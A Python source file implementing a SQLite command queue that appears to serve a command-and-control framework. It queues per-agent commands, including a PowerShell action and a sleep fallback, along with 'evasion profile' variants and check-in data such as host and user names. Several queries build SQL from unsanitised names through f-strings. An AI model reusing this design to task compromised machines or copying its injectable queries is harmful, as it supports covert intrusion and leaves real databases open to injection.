import sqlite3
import logging
import inspect

## temp sleep string
sleep_string = '''{"general": {"action": "sleep", "client_id": "", "client_type": "", "password": ""}, "conn": {"client_ip": "", "client_port": ""}, "msg": {"msg_to": "", "msg_content": "", "msg_command": "sleep", "msg_value": "", "msg_length": "", "msg_hash": ""}, "stats": {"latest_checkin": "", "device_hostname": "", "device_username": ""}, "security": {"client_hash": "", "server_hash": ""}}'''
ps_whoami_string = '''{"general": {"action": "powershell", "client_id": "", "client_type": "", "password": ""}, "conn": {"client_ip": "", "client_port": ""}, "msg": {"msg_to": "", "msg_content": "", "msg_command": "powershell", "msg_value": "", "msg_length": "", "msg_hash": ""}, "stats": {"latest_checkin": "", "device_hostname": "", "device_username": "", "timestamp":"timestamp"}, "security": {"client_hash": "", "server_hash": ""}}'''
function_debug_symbol = "[^]"

class SQLDBHandler:
    def __init__(self, db_name):
        self.dbconn = None
        self.cursor = None
        self.connect_to_db(db_name)


    ## Callables by user
    def dequeue_next_cmd(self, client_name) -> str:
        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")

        ''' This is kinda ugly
        Steps:

        gets next queue number from DB.
        With said number, retrieves the MSG from that row
        returns message.
        increments current queue and next queue by 1 in DB
        
        Errors:
            If this tries to access beyond the messages in queued message, it errors out.

        Failrue/Failover handling: 
            Returns a sleep string if something fails
        '''
        try:
            next_queue_number       = self.get_next_queue_number(client_name)
            current_queue_number    = self.get_current_queue_number(client_name)

            logging.debug(f"[DB Handler (dequeue_client_row)] Current Queue #: {current_queue_number}\nNext Queue Num: {next_queue_number}")
        
            self.increment_queue_number(client_name)
            

            ## SHOULD be json, nothign to actually check that though
            client_msg = self.get_command_from_queue_number(client_name = client_name, next_queue_number=next_queue_number)
            return client_msg

        except TypeError as te:
            logging.debug(f"[DBHandler.update_queue_tracker()] Queue is empty. Sending sleep: {te}")
            return sleep_string
        
        except ValueError as ve:
            #logging.debug(e)
            logging.debug(f"[DBHandler.update_queue_tracker()] Value error, the DB may have tried to access a message that didn't exist: {ve}")
            return sleep_string

        except Exception as e:
            #logging.debug(e)
            logging.debug(f"[DBHandler.update_queue_tracker()] Error: {e}")
            return sleep_string
        
    def enqueue_client_row(self, client_name="TestClient", msg=ps_whoami_string, modified_command = "", response="empty", requester="empty"):
        """Enqueues a command to the queue

        Args:
            client_name (str, optional): The name of the client (which is used for the table) ** Needs to get changed to agent
            id (_type_, optional): The id of the message. increments by 1 upwards to track the queue
            msg (str, optional): the JSON message going TO the client.
            modified_command: The command modified to be in line with the evasion profile.
            response (str, optional): the JSON response FROM the client. 
            requester (str, optional): Which agent requested this action.
        """
        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")

        if not self.check_if_agent_table_exists():
            logging.warning(f"[!] Agent {client_name} does not have a table. Creating one. This is not intended behavior, and may cause problems")
            ## Do we want to create the table then? Might be a good setting.
            ## This could also cause some issues when trying to access this table.
            self.create_client_table(client_name = client_name)

        ##jank...
        id = self.get_next_queue_number(client_name=client_name)

        try:
            # Check if the ID already exists in the table
            check_query = f'SELECT id FROM {client_name} WHERE id = ?'
            self.cursor.execute(check_query, (id,))
            existing_row = self.cursor.fetchone()
            if existing_row:
                ## maybe recurse with id + 1 until it gets it right? 
                logging.debug(f"ID {id} already exists in the {client_name} table.")
                return

            # If the ID is unique, add to queue
            insert_query = f'INSERT INTO {client_name} (id, command, response, requester) VALUES (?, ?, ?, ?)'
            values = (id, msg, response, requester)
            self.cursor.execute(insert_query, values)
            self.dbconn.commit()  
        except Exception as e:
            logging.debug(f"[DBHandler.enqueue_mclient_row()] Error: {e}")

    def add_response_from_client(self, response="None", client_name="TestClient"):
        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")

        try:
            id = self.get_current_queue_number(client_name)

            sql_query   = f'UPDATE {client_name} SET response = ? WHERE id = ?'
            values      = (response, id,)
            logging.debug(f"[DBHandler (add_response_to_queue_number)] Adding '{len(response)}' to id: {id} in {client_name}")
            
            self.cursor.execute(sql_query, values)
            self.dbconn.commit()

        except Exception as e:
            logging.debug(e)
            logging.debug(f"[DBHandler.add_response_mclient_row()] Error: {e}")


    ## DB obs
    def connect_to_db(self, db_name):
        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")

        try:
            self.dbconn = sqlite3.connect(db_name)
            self.cursor = self.dbconn.cursor()
            logging.debug(f"[DBHandler.connect_to_db()] Successful connection to: {db_name}")

        except Exception as e:
            logging.debug(f"[DBHandler.connect_to_db()] Error: {e}")

    def get_command_from_queue_number(self, client_name, next_queue_number) -> str:
        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")

        '''
        Gets, and returns the next command in the queue based on the queue number passed to it. 
        
        '''
        self.cursor.execute(f'select command from {client_name} where id = "{next_queue_number}"')
            ## [0] is needed, as this returns (MSG,)
        msg = self.cursor.fetchone()#[0]

        logging.debug(f"[DBHandler (get_command_from_queue_number)] Getting msg from id: {next_queue_number} in {client_name}]")

        if msg == None:
            raise TypeError
            
        msg = msg[0]
        return msg

    def get_current_queue_number(self, client_name) -> int:
        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")

        """Gets cuirrent item in queue

        Args:
            client_name (string): The client name. This is used for the lookup

        raises: 
            Typeerror

        returns:
            AN Int, which is the next item in the queue
        """
        self.cursor.execute(f'select current_queue_number from client_queue_tracker where client_name = "{client_name}"')
        ## [0] is needed, as this returns (1,)
        current_queue_number = self.cursor.fetchone()#[0]

        if current_queue_number == None:
            raise TypeError

        current_queue_number = current_queue_number[0]
        return current_queue_number

    def get_next_queue_number(self, client_name) -> int:
        """Gets next item up in queue

        Args:
            client_name (string): The client name. This is used for the lookup

        raises: 
            Typeerror

        returns:
            AN Int, which is the next item in the queue
        """
        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")


        self.cursor.execute(f'select next_queue_number from client_queue_tracker where client_name = "{client_name}"')
        ## [0] is needed, as this returns (1,)
        next_queue_number = self.cursor.fetchone()#[0]

        if next_queue_number == None:
            raise TypeError

        next_queue_number = next_queue_number[0]
        return next_queue_number

    def increment_queue_number(self, client_name):
        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")

        current_queue_number    = self.get_current_queue_number(client_name)
        next_queue_number       = self.get_next_queue_number(client_name)

        update_query    = f'UPDATE client_queue_tracker SET current_queue_number = ?, next_queue_number = ? WHERE client_name = ?'
        values          = (current_queue_number + 1, next_queue_number + 1, client_name)
            
        self.cursor.execute(update_query, values)
        self.dbconn.commit()
        logging.debug("[DBHandler (increment_queue_number)] Inrementing both  queue number +1 ")

    def check_if_agent_table_exists(self, client_name = None) -> bool:
        '''
        A check to check if a client table exists before trying to do any actions on it.
        '''
        self.cursor.execute(f"SELECT name FROM sqlite_master WHERE type='table' AND name=?", (client_name,))
        table_exists = self.cursor.fetchone()

        ## checking if there's actually a table
        if table_exists:
            return True
        else:
            return False

    ## == client_queue_tracker table == ##
    def create_client_table(self, client_name = "TestClient"):
        try:
            logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")

            self.cursor.execute(f'''
            CREATE TABLE IF NOT EXISTS {client_name} (
            id INTEGER,
            command BLOB,
            modified_command BLOB,
            response BLOB,
            requester BLOB
            )
            ''')
            self.dbconn.commit()
            logging.debug(f"[*] Table for {client_name} created")
        except Exception as e:
            logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}: {e}")


    def create_client_queuetrack_table(self):
        """
            Creates queue tracking tbale. this is handy for if the server crashes, as it stores which 
            command is up next for the agent to run
        """
        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")

        self.cursor.execute(f'''
        CREATE TABLE IF NOT EXISTS client_queue_tracker (
        current_queue_number INTEGER,
        client_name BLOB,
        next_queue_number BLOB
        )
        ''')
        self.dbconn.commit()

    def create_client_queuetrack_row(self, client_name = "TestClient"):
        logging.debug(f"{function_debug_symbol} {inspect.stack()[0][3]}")

        """Creates a row for the client (if it does not exist - working on that part)

        Args:
            client_name (str, optional): Name of client 
        """
        check_query = f'SELECT client_name FROM client_queue_tracker WHERE client_name = ?'
        self.cursor.execute(check_query, (client_name,))
        existing_row = self.cursor.fetchone()
        if existing_row:
            ## maybe recurse with id + 1 until it gets it right? 
            logging.debug(f"ID {client_name} already exists in the client_queue_tracker table.")
            return


        insert_query = f'INSERT INTO client_queue_tracker (current_queue_number, client_name, next_queue_number) VALUES (?, ?, ?)'
        #logging.debug("insert into client_queue_tracker")
        values = (0, client_name, 1)
        self.cursor.execute(insert_query, values)
        self.dbconn.commit()

'''
## USage:

Client calls respective method, only needs to pass client_name. 

Methods:

== SETUP ==
create_client_table
    Creates a table with the client_name, and 4 feilds

create_client_queue_table
    Creates queue tracking table

== Actions on table ==
create_client_queue_row
    - Creates a row for the respective client


enqueue_client_command
    Enqueues a command to the queue

    
dequeue_client_command
    Pulls the latest/up next command from queue

    - Gets ID of next message.
    - Pulls msg from that ID
    - Incremetns queue
    - Returns msg value

    
== util funcs ==

check_if_row_exists -> bool
    Checks if msg ID already exists in table. 

get_next_queue_number() ->
    - gets the ID number of the message next in the queue

get_current_queue_number() ->
    - gets the ID number of the message currently in the queu (used for entering responses)

increment_queue()

'''